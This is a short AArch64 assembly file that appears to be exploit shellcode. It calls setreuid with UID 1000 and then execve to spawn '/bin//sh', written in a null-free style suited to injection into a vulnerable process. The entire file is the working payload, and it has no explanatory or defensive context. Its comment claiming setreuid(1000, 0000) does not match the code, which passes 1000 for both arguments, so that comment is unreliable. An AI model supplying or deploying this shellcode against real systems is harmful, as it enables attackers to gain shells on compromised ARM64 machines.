.section .text
.global _start

_start:

    // setreuid(1000, 0000)
    mov x8, #0x91
    mov x1, #1000 // target UID
    eor x0, xzr, x1

    svc #0x1337

    // execve("/bin//sh", NULL, NULL)
    movk x1, #0x622f
    movk x1, #0x6e69, lsl #0x10
    movk x1, #0x2f2f, lsl #0x20
    movk x1, #0x6873, lsl #0x30

    eor x2, xzr, xzr
    stp x1, x2, [sp], #0x40
    eor x1, xzr, xzr
    
    sub x0, sp, #0x40

    mov x8, #0xdd // SYS_execve

    svc #0x1337
